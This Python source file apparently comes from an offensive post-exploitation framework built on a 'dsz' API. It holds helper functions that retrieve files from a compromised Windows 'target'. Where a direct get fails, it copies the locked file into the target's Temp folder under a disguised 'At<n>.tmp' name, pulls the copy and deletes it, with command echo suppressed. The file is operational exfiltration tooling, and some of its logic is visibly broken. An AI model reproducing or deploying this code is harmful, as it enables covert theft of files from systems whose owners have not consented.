
import sys, os, os.path
import dsz, dsz.path.windows
from opsdata import metadata
import re

def copyget(targetfilename, start=(-1), end=(-1), tail=(-1), name=''):
    targettemp = ((dsz.path.windows.GetSystemPaths()[0] + os.sep) + 'Temp')
    dsz.control.echo.Off()
    dsz.cmd.Run(('dir -mask At* -path %s' % targettemp), dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    badnums = list()
    for diritem in dsz.cmd.data.Get('DirItem', dsz.TYPE_OBJECT):
        for fileitem in dsz.cmd.data.ObjectGet(diritem, 'FileItem', dsz.TYPE_OBJECT):
            match = re.search('[0-9]+', dsz.cmd.data.ObjectGet(fileitem, 'name', dsz.TYPE_STRING)[0])
            if match:
                badnums.append(int(match.string[match.start():match.end()]))
    for i in range(1000000):
        if (i not in badnums):
            goodnum = i
            break
    tempfilename = ((targettemp + os.sep) + ('At%d.tmp' % goodnum))
    dsz.ui.Echo(('Running copy "%s" "%s"' % (targetfilename, tempfilename)))
    dsz.control.echo.Off()
    dsz.cmd.Run(('copy "%s" "%s"' % (targetfilename, tempfilename)))
    dsz.control.echo.On()
    copymeta = metadata.getLastCommandMeta()
    if (copymeta.Status == 0):
        getresult = trybaseget(tempfilename, start, end, tail, name)
        if getresult.successful:
            dsz.ui.Echo(('Running del "%s"' % tempfilename))
            dsz.control.echo.Off()
            dsz.cmd.Run(('del "%s"' % tempfilename))
            dsz.control.echo.On()
            delmeta = metadata.getLastCommandMeta()
            if (delmeta.Status != 0):
                dsz.ui.Echo('Unable to delete temp file %s, please delete this!!!', dsz.WARNING)
                return getresult
        else:
            dsz.ui.Echo(('Get of copy failed, please manually delete %s' % tempfilename))
            return getresult
    else:
        dsz.ui.Echo('Unable to copy file', dsz.WARNING)
        return None

def wrapget(targetfilename, warnsize=(-1), allowcopy=None):
    getresult = None
    if (targetfilename[0] == '"'):
        targetfilename = targetfilename[1:(-1)]
    (targpath, targfile) = os.path.split(targetfilename)
    if (warnsize > (-1)):
        dsz.ui.Echo('Checking file size...')
        dsz.control.echo.Off()
        dsz.cmd.Run(('fileattributes -file "%s"' % targetfilename), dsz.RUN_FLAG_RECORD)
        dsz.control.echo.On()
        filesize = dsz.cmd.data.Get('file::size', dsz.TYPE_INT)[0]
        if (filesize > warnsize):
            dsz.ui.Echo(('The file is %d bytes, which is big.' % filesize), dsz.WARNING)
            answer = dsz.ui.Prompt('Are you sure you want to get it?', False)
            if (not answer):
                dsz.ui.Echo('Quitting then...')
                return None
        else:
            dsz.ui.Echo(('%d bytes, this is ok...' % filesize))
    getresult = trybaseget(targetfilename)
    if (not getresult.successful):
        if (allowcopy == None):
            allowcopy = dsz.ui.Prompt('Cannot get with normal get, would you like to try a copyget?')
        if allowcopy:
            getresult = copyget(targetfilename)
    return getresult

def trybaseget(targetfilename, start=(-1), end=(-1), tail=(-1), name=''):
    if (targetfilename[0] == '"'):
        targetfilename = targetfilename[1:(-1)]
    cmd = ('get "%s" ' % targetfilename)
    if (name != ''):
        cmd += ('-name %s ' % name)
    if ((start > (-1)) and (end == (-1))):
        cmd += (' -range %d ' % start)
    elif ((start > (-1)) and (end > (-1))):
        if (end > start):
            raise Exception('Start must come before end on a range get')
        cmd += (' -range %d %d ' % (start, end))
    elif ((start == (-1)) and (end > (-1))):
        cmd += (' -range 0 %d ' % end)
    elif (tail > (-1)):
        cmd += (' -tail %d ' % tail)
    dsz.ui.Echo(('Running %s' % cmd))
    dsz.control.echo.Off()
    dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    getcmdid = dsz.cmd.LastId()
    getmeta = metadata.DszCommandMetadata(getcmdid)
    getresult = FileGetInfo()
    return getresult

class FileGetInfo(object, ):

    def __init__(self, cmdid=0, fileid=0):
        if (cmdid == 0):
            (cmdid == dsz.cmd.LastId())
        self.localpath = dsz.cmd.data.Get('localgetdirectory::path', dsz.TYPE_STRING, cmdid)[0]
        for filelocal in dsz.cmd.data.Get('FileLocalName', dsz.TYPE_OBJECT, cmdid):
            if (str(fileid) == dsz.cmd.data.ObjectGet(filelocal, 'id', dsz.TYPE_STRING, cmdid)[0]):
                self.localname = dsz.cmd.data.ObjectGet(filelocal, 'localname', dsz.TYPE_STRING, cmdid)[0]
        self.isComplete = False
        self.successful = None
        self.written = (-1)
        for fileend in dsz.cmd.data.Get('FileStop', dsz.TYPE_OBJECT, cmdid):
            if (str(fileid) == dsz.cmd.data.ObjectGet(fileend, 'id', dsz.TYPE_STRING, cmdid)[0]):
                self.isComplete = True
                self.successful = dsz.cmd.data.ObjectGet(fileend, 'successful', dsz.TYPE_BOOL, cmdid)[0]
                self.written = dsz.cmd.data.ObjectGet(fileend, 'written', dsz.TYPE_INT, cmdid)[0]

    def _getLocalLocation(self):
        return os.path.normpath(((((dsz.env.Get('_LOGPATH') + os.sep) + self.localpath) + os.sep) + self.localname))
    FullLocalName = property(_getLocalLocation)